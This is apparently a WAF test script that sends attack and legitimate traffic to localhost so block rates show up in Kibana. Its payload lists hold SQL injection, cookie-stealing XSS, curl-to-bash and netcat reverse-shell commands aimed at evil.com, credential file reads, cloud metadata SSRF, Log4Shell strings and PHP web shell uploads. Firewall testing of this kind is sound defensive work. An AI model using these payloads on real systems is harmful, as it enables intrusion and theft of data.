#!/usr/bin/env python3
"""
🐝 BeeWAF Kibana Traffic Generator
Generates diverse attack + legitimate traffic for rich Kibana visualizations.
"""

import requests
import urllib3
import time
import random
import sys

urllib3.disable_warnings()
BASE = "https://127.0.0.1"
S = requests.Session()
S.verify = False

# ─── Attack Payloads by Category ───────────────────────────────────────
ATTACKS = {
    "sqli": [
        ("GET", "/?id=1' OR '1'='1", None),
        ("GET", "/?id=1 UNION SELECT username,password FROM users--", None),
        ("POST", "/login", "username=admin' OR 1=1--&password=x"),
        ("GET", "/?q=1; DROP TABLE users;--", None),
        ("GET", "/?id=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", None),
        ("POST", "/search", '{"query":"1\' UNION ALL SELECT NULL,table_name FROM information_schema.tables--"}'),
        ("GET", "/?id=1' WAITFOR DELAY '0:0:5'--", None),
        ("GET", "/?sort=name;SELECT pg_sleep(5)--", None),
        ("POST", "/api/data", "filter=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--"),
        ("GET", "/?id=-1 UNION SELECT LOAD_FILE('/etc/passwd')--", None),
    ],
    "xss": [
        ("GET", "/?q=<script>alert('XSS')</script>", None),
        ("POST", "/comment", "body=<img src=x onerror=alert(1)>"),
        ("GET", "/?name=<svg/onload=alert(document.cookie)>", None),
        ("POST", "/profile", "bio=<iframe src=javascript:alert(1)>"),
        ("GET", "/?q=<body onload=alert('xss')>", None),
        ("POST", "/feedback", "msg=<input autofocus onfocus=alert(1)>"),
        ("GET", '/?redirect=javascript:alert(document.domain)', None),
        ("POST", "/api/comment", '{"text":"<script>fetch(\'https://evil.com/steal?c=\'+document.cookie)</script>"}'),
        ("GET", "/?q=%3Cscript%3Edocument.location%3D'http://evil.com/'%2Bdocument.cookie%3C/script%3E", None),
        ("POST", "/upload", "filename=<svg onload=alert(1)>.html"),
    ],
    "cmdi": [
        ("GET", "/?cmd=;cat /etc/passwd", None),
        ("POST", "/ping", "host=127.0.0.1;id"),
        ("GET", "/?file=test|whoami", None),
        ("POST", "/exec", "command=`curl http://evil.com/shell.sh|bash`"),
        ("GET", "/?path=;wget http://evil.com/backdoor -O /tmp/bd", None),
        ("POST", "/api/run", '{"cmd":"$(python -c \'import socket; s=socket.socket()\')"}'),
        ("GET", "/?dir=;nc -e /bin/sh evil.com 4444", None),
        ("POST", "/process", "input=test\nid\nwhoami"),
    ],
    "path_traversal": [
        ("GET", "/../../etc/passwd", None),
        ("GET", "/..%2f..%2f..%2fetc%2fpasswd", None),
        ("GET", "/....//....//....//etc/passwd", None),
        ("GET", "/?file=../../../etc/shadow", None),
        ("GET", "/download?path=..\\..\\..\\windows\\system32\\config\\sam", None),
        ("GET", "/?template=..%252f..%252f..%252fetc%252fpasswd", None),
        ("GET", "/static/..%c0%af..%c0%af..%c0%afetc/passwd", None),
        ("POST", "/read", "file=/proc/self/environ"),
    ],
    "ssrf": [
        ("GET", "/?url=http://169.254.169.254/latest/meta-data/", None),
        ("POST", "/fetch", "url=http://metadata.google.internal/computeMetadata/v1/"),
        ("GET", "/?url=http://[::ffff:169.254.169.254]/", None),
        ("POST", "/proxy", '{"target":"http://169.254.169.254/latest/api/token"}'),
        ("GET", "/?url=http://kubernetes.default.svc/api/v1/secrets", None),
        ("POST", "/webhook", "callback=http://127.0.0.1:6379/"),
    ],
    "xxe": [
        ("POST", "/api/xml", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
        ("POST", "/upload", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><data>&xxe;</data>'),
        ("POST", "/api/parse", '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><root>&lol2;</root>'),
    ],
    "ssti": [
        ("GET", "/?name={{7*7}}", None),
        ("POST", "/template", "content={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
        ("GET", "/?q=${7*7}", None),
        ("POST", "/render", "tpl=<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"),
    ],
    "log4shell": [
        ("GET", "/", None),  # with JNDI header
        ("POST", "/api/login", '{"user":"${jndi:ldap://evil.com/exploit}"}'),
    ],
    "scanner_probe": [
        ("GET", "/.git/HEAD", None),
        ("GET", "/.env", None),
        ("GET", "/wp-config.php", None),
        ("GET", "/phpinfo.php", None),
        ("GET", "/.htaccess", None),
        ("GET", "/wp-admin/install.php", None),
        ("GET", "/actuator/env", None),
        ("GET", "/debug/pprof/", None),
        ("GET", "/.svn/entries", None),
        ("GET", "/web.config", None),
    ],
    "deserialization": [
        ("POST", "/api/data", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="),
        ("POST", "/process", 'O:8:"PHPClass":1:{s:4:"exec";s:6:"whoami";}'),
        ("POST", "/api/load", "yaml.load(open('/etc/passwd'))"),
    ],
    "file_upload": [
        ("POST", "/upload", "filename=shell.php&content=<?php system($_GET['cmd']); ?>"),
        ("POST", "/upload", "filename=backdoor.jsp&content=Runtime.getRuntime().exec(cmd)"),
        ("POST", "/upload", "filename=exploit.php.jpg"),
    ],
    "jwt_attack": [
        ("GET", "/api/profile", None),  # with alg:none JWT
        ("GET", "/api/admin", None),  # with forged admin JWT
    ],
    "graphql": [
        ("POST", "/graphql", '{"query":"{ __schema { types { name fields { name } } } }"}'),
        ("POST", "/graphql", '{"query":"query { a1:user(id:1){name} a2:user(id:2){name} a3:user(id:3){name} a4:user(id:4){name} a5:user(id:5){name} a6:user(id:6){name} a7:user(id:7){name} a8:user(id:8){name} a9:user(id:9){name} a10:user(id:10){name} }"}'),
    ],
    "crlf": [
        ("GET", "/?q=test%0d%0aSet-Cookie:hacked=true", None),
        ("GET", "/?redirect=http://evil.com%0d%0aInjected-Header:value", None),
    ],
    "nosql": [
        ("POST", "/api/login", '{"username":{"$ne":""},"password":{"$ne":""}}'),
        ("POST", "/api/search", '{"filter":{"$where":"function(){return true}"}}'),
    ],
    "windows": [
        ("GET", "/?cmd=cmd.exe /c dir c:\\", None),
        ("POST", "/exec", "command=powershell -enc SQBFAFgA"),
        ("GET", "/?path=\\\\evil.com\\share\\payload.exe", None),
    ],
    "cloud": [
        ("GET", "/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", None),
        ("GET", "/?url=http://metadata.google.internal/computeMetadata/v1/project/project-id", None),
    ],
}

# ─── Legitimate Traffic ────────────────────────────────────────────────
LEGITIMATE = [
    ("GET", "/", None, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"),
    ("GET", "/health", None, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"),
    ("POST", "/echo", '{"message":"Hello World"}', "Mozilla/5.0 (X11; Linux x86_64)"),
    ("GET", "/api/products?page=1&limit=20", None, "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0)"),
    ("POST", "/echo", '{"name":"John Doe","email":"john@example.com"}', "Mozilla/5.0 (Windows NT 10.0)"),
    ("GET", "/api/categories?lang=en", None, "Mozilla/5.0 (Android 13; Mobile)"),
    ("POST", "/echo", '{"query":"select best products","category":"electronics"}', "Mozilla/5.0 (Windows NT 10.0)"),
    ("GET", "/images/photo.jpg", None, "Mozilla/5.0 (Macintosh; Intel Mac OS X)"),
    ("GET", "/docs/api-guide.pdf", None, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
    ("GET", "/api/v2/status", None, "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)"),
    ("POST", "/echo", '{"search":"description of products"}', "Mozilla/5.0 (Windows NT 10.0)"),
    ("GET", "/assets/style.css", None, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15)"),
    ("GET", "/api/users/123/profile", None, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
    ("POST", "/echo", '{"comment":"Great service! 5 stars."}', "Mozilla/5.0 (iPhone; CPU iPhone OS 17)"),
    ("GET", "/favicon.ico", None, "Mozilla/5.0 (Windows NT 10.0)"),
    ("GET", "/robots.txt", None, "Googlebot/2.1"),
    ("GET", "/sitemap.xml", None, "Googlebot/2.1"),
    ("POST", "/echo", '{"order":{"item":"laptop","qty":1,"price":999.99}}', "Mozilla/5.0 (Windows NT 10.0)"),
    ("GET", "/api/news?category=tech&page=2", None, "Mozilla/5.0 (X11; Linux x86_64)"),
    ("POST", "/echo", '{"feedback":"The monitoring dashboard works great"}', "Mozilla/5.0 (Windows NT 10.0)"),
]

# ─── Scanner User Agents ──────────────────────────────────────────────
SCANNER_UAS = [
    "sqlmap/1.7",
    "Nikto/2.5.0",
    "Nmap Scripting Engine",
    "masscan/1.3",
    "DirBuster-1.0",
    "Acunetix-Scanner",
    "w3af.org",
    "Havij",
    "WPScan v3.8",
    "Burp Suite Scanner",
]

def send_request(method, path, body, headers=None, ua=None):
    """Send a request and return status code."""
    url = BASE + path
    h = headers or {}
    if ua:
        h["User-Agent"] = ua
    try:
        if method == "GET":
            r = S.get(url, headers=h, timeout=10)
        else:
            if body and body.strip().startswith("{"):
                h["Content-Type"] = "application/json"
            r = S.post(url, data=body, headers=h, timeout=10)
        return r.status_code
    except Exception as e:
        return f"ERR: {e}"

def main():
    print("=" * 70)
    print("🐝 BeeWAF Kibana Traffic Generator")
    print("=" * 70)
    
    rounds = int(sys.argv[1]) if len(sys.argv) > 1 else 3
    total_sent = 0
    total_blocked = 0
    total_passed = 0
    stats = {}

    for round_num in range(1, rounds + 1):
        print(f"\n{'─' * 60}")
        print(f"📡 Round {round_num}/{rounds}")
        print(f"{'─' * 60}")

        # ── Send attacks ──
        for category, payloads in ATTACKS.items():
            blocked = 0
            for method, path, body in payloads:
                headers = {}
                ua = None

                # Special cases
                if category == "log4shell" and path == "/":
                    headers["X-Forwarded-For"] = "${jndi:ldap://evil.com/exploit}"
                    headers["User-Agent"] = "${jndi:ldap://attacker.com/a}"
                elif category == "jwt_attack":
                    headers["Authorization"] = "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
                elif category == "scanner_probe":
                    ua = random.choice(SCANNER_UAS)
                else:
                    ua = random.choice(SCANNER_UAS + ["Mozilla/5.0 (evil)"] * 3)

                status = send_request(method, path, body, headers, ua)
                total_sent += 1
                if status == 403:
                    blocked += 1
                    total_blocked += 1
                else:
                    total_passed += 1

                time.sleep(0.05)  # Small delay to spread in time

            stats[category] = stats.get(category, 0) + blocked
            symbol = "✅" if blocked == len(payloads) else "⚠️"
            print(f"  {symbol} {category:20s} → {blocked}/{len(payloads)} blocked")

        # ── Send legitimate traffic ──
        legit_passed = 0
        for method, path, body, ua in LEGITIMATE:
            status = send_request(method, path, body, ua=ua)
            total_sent += 1
            if status != 403:
                legit_passed += 1
                total_passed += 1
            else:
                total_blocked += 1
            time.sleep(0.03)

        print(f"  🟢 {'legitimate':20s} → {legit_passed}/{len(LEGITIMATE)} passed (0 FP)")

        # ── Send scanner probes with various UAs ──
        for ua in SCANNER_UAS:
            status = send_request("GET", "/", None, ua=ua)
            total_sent += 1
            if status == 403:
                total_blocked += 1
            else:
                total_passed += 1
            time.sleep(0.05)

        print(f"  🔍 {'scanner UAs':20s} → {len(SCANNER_UAS)} probes sent")

        # ── Random mixed traffic burst ──
        burst_size = 50
        for _ in range(burst_size):
            if random.random() < 0.6:  # 60% attacks
                cat = random.choice(list(ATTACKS.keys()))
                method, path, body = random.choice(ATTACKS[cat])
                ua = random.choice(SCANNER_UAS + ["Mozilla/5.0"])
            else:  # 40% legitimate
                method, path, body, ua = random.choice(LEGITIMATE)
            status = send_request(method, path, body, ua=ua)
            total_sent += 1
            if status == 403:
                total_blocked += 1
            else:
                total_passed += 1
            time.sleep(0.02)

        print(f"  🔀 {'mixed burst':20s} → {burst_size} requests")

    # ── Summary ──
    print(f"\n{'=' * 70}")
    print(f"📊 TRAFFIC GENERATION COMPLETE")
    print(f"{'=' * 70}")
    print(f"  Total requests sent:  {total_sent}")
    print(f"  Blocked (attacks):    {total_blocked}")
    print(f"  Passed (legitimate):  {total_passed}")
    print(f"  Block rate:           {total_blocked/total_sent*100:.1f}%")
    print(f"\n📈 Attack categories breakdown:")
    for cat, count in sorted(stats.items(), key=lambda x: -x[1]):
        print(f"    {cat:25s} → {count} blocked across {rounds} rounds")
    print(f"\n✅ Data is now flowing into Elasticsearch → Kibana!")
    print(f"🔗 Open Kibana: http://localhost:5601")

if __name__ == "__main__":
    main()
